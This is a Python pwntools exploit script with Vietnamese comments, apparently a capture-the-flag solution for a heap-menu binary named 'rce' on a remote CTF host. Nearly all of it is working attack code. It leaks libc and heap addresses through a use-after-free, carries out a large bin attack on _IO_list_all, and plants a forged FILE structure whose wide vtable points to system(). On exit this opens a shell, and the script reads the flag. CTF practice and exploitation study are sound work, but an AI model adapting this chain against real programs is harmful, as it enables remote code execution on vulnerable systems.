from pwn import *

# --- CẤU HÌNH ---
exe = ELF('./rce', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'debug'

def solve():
    if args.REMOTE:
        p = remote('ctf.csd.lol', 2024)
    else:
        p = process('./rce')

    def alloc(idx, size, data=b'A'):
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'idx: ', str(idx).encode())
        p.sendlineafter(b'size: ', str(size).encode())
        p.sendafter(b'data: ', data)

    def free(idx):
        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b'idx: ', str(idx).encode())

    def edit(idx, data):
        p.sendlineafter(b'> ', b'3')
        p.sendlineafter(b'idx: ', str(idx).encode())
        p.sendafter(b'data: ', data)

    def view(idx):
        p.sendlineafter(b'> ', b'4')
        p.sendlineafter(b'idx: ', str(idx).encode())
        p.recvuntil(b'data: ')
        return p.recvline()[:-1]

    try:
        log.info("--- 1. PREPARE HEAP ---")
        alloc(0, 16, b'INIT')

        # Chunk 1: Large A
        alloc(1, 0x8000, b'A'*8)
        # Guard 1
        alloc(2, 0x100, b'G1')
        # Chunk 3: Large B
        alloc(3, 0x8000, b'B'*8)
        # Guard 2
        alloc(4, 0x100, b'G2')

        # Free 1 -> Unsorted
        free(1)
        
        # Alloc 5 (Size lớn) -> Đẩy Chunk 1 vào Large Bin
        alloc(5, 0x9000, b'PUSH') 
        
        log.info("--- 2. LEAK ---")
        # Leak Libc (từ Chunk 1)
        leak_raw = view(1)
        leak_libc = u64(leak_raw[:8].ljust(8, b'\0'))
        
        # Offset Libc 2.35/2.36
        libc.address = leak_libc - 0x21a0d0 # Thử offset này trước
        if (libc.address & 0xfff) != 0:
             libc.address = leak_libc - 0x219ce0 # Offset chuẩn Ubuntu
        if (libc.address & 0xfff) != 0:
             libc.address = leak_libc - 0x1d2cc0 # Offset Debian
             
        log.success(f"Libc Base: {hex(libc.address)}")

        # [FIX] Leak Heap (Overwrite 17 bytes)
        # Ghi đè fd, bk (16 bytes) + 1 byte của fd_nextsize (để bypass null byte)
        edit(1, b'A'*17)
        
        leak_heap_raw = view(1)
        if len(leak_heap_raw) < 18: # 17 'A' + ít nhất 1 byte heap
            log.error("Heap leak failed.")
            return
            
        # Lấy các byte heap sau 17 chữ A
        heap_leak_part = leak_heap_raw[17:]
        # Khôi phục: thêm byte 0 vào cuối (LSB)
        heap_leak = u64(b'\x00' + heap_leak_part.ljust(7, b'\x00'))
        
        log.success(f"Heap Leak (Chunk 1): {hex(heap_leak)}")
        
        # Restore Chunk 1 (Trả lại fd, bk chuẩn)
        main_arena = leak_libc
        # fd=main_arena, bk=main_arena, fd_nextsize=heap_leak, bk_nextsize=heap_leak
        payload_restore = p64(main_arena)*2 + p64(heap_leak)*2
        edit(1, payload_restore)

        log.info("--- 3. ATTACK ---")
        target_addr = libc.sym['_IO_list_all']
        
        # Free Chunk 3 -> Unsorted Bin
        free(3)
        
        # Tính toán địa chỉ Chunk 3
        # Heap Leak là địa chỉ Chunk 1 (Header).
        # Chunk 3 = Chunk 1 + Size(1) + Size(2)
        # Size(1) = 0x8010 (Aligned), Size(2) = 0x110
        chunk1_addr = heap_leak
        chunk3_addr = heap_leak + 0x8120
        
        # --- BUILD FAKE FILE (CHUNK 3) ---
        fp = FileStructure(null=0)
        # Flags="  sh" (pass check & arg system)
        fp.flags = u64(b'  sh\0\0\0\0')
        fp._IO_read_ptr = 0x61
        fp._lock = chunk3_addr + 0x200
        fp._wide_data = chunk3_addr + 0x100
        fp.vtable = libc.sym['_IO_wfile_jumps'] + 0x18
        
        payload_fp = bytes(fp)
        
        # Wide Data -> Vtable Ptr (offset 0xe0)
        wide_data = b'\x00'*0xe0 + p64(chunk3_addr + 0x100 + 0xe0 + 0x10)
        # Wide Vtable -> System (offset 0x68)
        wide_vtable = b'\x00'*0x68 + p64(libc.sym['system'])
        
        # Ghép payload cho Chunk 3
        full_chunk3 = payload_fp.ljust(0x100, b'\0') + wide_data + wide_vtable
        edit(3, full_chunk3)
        
        # --- LARGE BIN ATTACK (CHUNK 1) ---
        # Sửa bk_nextsize -> Target - 0x20
        # Sửa _chain (offset 0x68) -> Chunk 3
        payload_1 = p64(main_arena)*2 + p64(chunk1_addr) + p64(target_addr - 0x20)
        payload_1 = payload_1.ljust(0x68, b'\0') + p64(chunk3_addr)
        
        edit(1, payload_1)

        log.info("--- 4. TRIGGER ---")
        # Alloc 6 (Size > Chunk 3) -> Đẩy Chunk 3 vào Large Bin -> Trigger write
        alloc(6, 0x9000, b'TRIGGER')
        
        log.success("Exiting to trigger shell...")
        p.sendlineafter(b'> ', b'0') 
        
        # Gửi lệnh lấy cờ
        p.sendline(b'cat flag*')
        p.interactive()

    except Exception as e:
        log.error(str(e))
        p.close()

if __name__ == "__main__":
    solve()